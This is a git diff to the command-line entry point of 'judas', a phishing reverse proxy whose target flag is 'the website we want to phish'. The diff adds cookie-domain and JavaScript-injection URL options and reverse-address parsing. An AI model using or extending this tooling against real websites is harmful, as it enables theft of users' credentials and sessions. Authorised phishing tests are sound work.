@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"crypto/x509"
+	"errors"
 	"flag"
 	"fmt"
 	"github.com/joncooperworks/judas"
@@ -12,21 +13,24 @@ import (
 	_ "net/http/pprof"
 	"net/url"
 	"os"
+	"strconv"
 	"strings"
 )
 
 var (
-	targetURL           = flag.String("target", "", "The website we want to phish.")
-	address             = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
-	attachProfiler      = flag.Bool("with-profiler", false, "Attach profiler to instance.")
-	proxyURL            = flag.String("proxy", "", "Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.")
-	javascriptURL       = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
-	insecure            = flag.Bool("insecure", false, "Listen without TLS.")
-	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
-	proxyCACert 		= flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
-	proxyCAKey 			= flag.String("proxy-ca-key", "", "Proxy CA key for signed requests")
-	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
-	pluginPaths         = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
+	targetURL      = flag.String("target", "", "The website we want to phish.")
+	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
+	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
+	proxyURL       = flag.String("proxy", "", "Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.")
+	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
+	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
+	sourceInsecure = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
+	proxyCACert    = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
+	proxyCAKey     = flag.String("proxy-ca-key", "", "Proxy CA key for signed requests")
+	sslHostname    = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
+	pluginPaths    = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
+	cookiesDomain  = flag.String("cookie-domain", "", "set Cookies Domain")
+	injectURL      = flag.String("inject-url", "*", "target URL to a JavaScript file you want injected. default * is all")
 )
 
 func exitWithError(message string) {
@@ -49,8 +53,29 @@ func setupRequiredFlags() {
 	}
 }
 
+func getReverse(ReverseAddress string) (*judas.ReverseConfig, error) {
+	revSplit := strings.Split(ReverseAddress, ":")
+
+	if len(revSplit) == 2 {
+		port, err := strconv.Atoi(revSplit[1])
+		if err != nil {
+			return nil, err
+		}
+		return &judas.ReverseConfig{
+			Address:      strings.Trim(revSplit[0], " "),
+			Port:         port,
+			CookieDomain: *cookiesDomain,
+			InjectURLs:   strings.Split(*injectURL, ","),
+		}, nil
+	}
+	return nil, errors.New("不支持ipv6")
+}
 func main() {
 	setupRequiredFlags()
+	ReverseAddress, err := getReverse(*address)
+	if err != nil {
+		panic(err)
+	}
 	log.Println("Setting target to", *targetURL)
 	u, err := url.Parse(*targetURL)
 	if err != nil {
@@ -113,6 +138,7 @@ func main() {
 
 	config := &judas.Config{
 		TargetURL:     u,
+		Reverse:       ReverseAddress,
 		Logger:        logger,
 		Transport:     transport,
 		JavascriptURL: *javascriptURL,
